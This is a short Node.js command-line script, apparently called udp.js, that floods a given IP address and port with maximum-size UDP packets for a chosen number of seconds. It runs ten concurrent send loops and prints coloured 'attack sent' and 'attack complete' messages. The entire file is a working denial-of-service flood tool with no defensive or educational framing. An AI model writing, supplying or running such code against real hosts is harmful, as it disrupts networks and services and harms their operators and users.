const udp = require('dgram');
const client = udp.createSocket('udp4');

const args = process.argv.slice(2);

if (args.length !== 3) {
    console.log("\x1b[33mUsage: \x1b[34mnode udp.js <ip> <port> <time>");
    process.exit(1);
}

const ip = args[0];
const port = parseInt(args[1]);
const time = parseInt(args[2]);
const thread = 10;

const data = Buffer.allocUnsafe(65507);
let attacking = true;

console.clear();
console.log(`\x1b[31m> \x1b[32mloading socket\n\x1b[31m! \x1b[37mflood \x1b[32mudpDgram \x1b[37mattack sent \x1b[33m${ip}:${port} \x1b[32mstarted \x1b[31m!!!`);

for (let i = 0; i < thread; i++) {
    (function sendPacket() {
        if (attacking) {
            client.send(data, port, ip, sendPacket);
        }
    })();
}

setTimeout(() => {
    attacking = false;
    client.close();
    console.log("\x1b[32mattack complete");
}, time * 1000);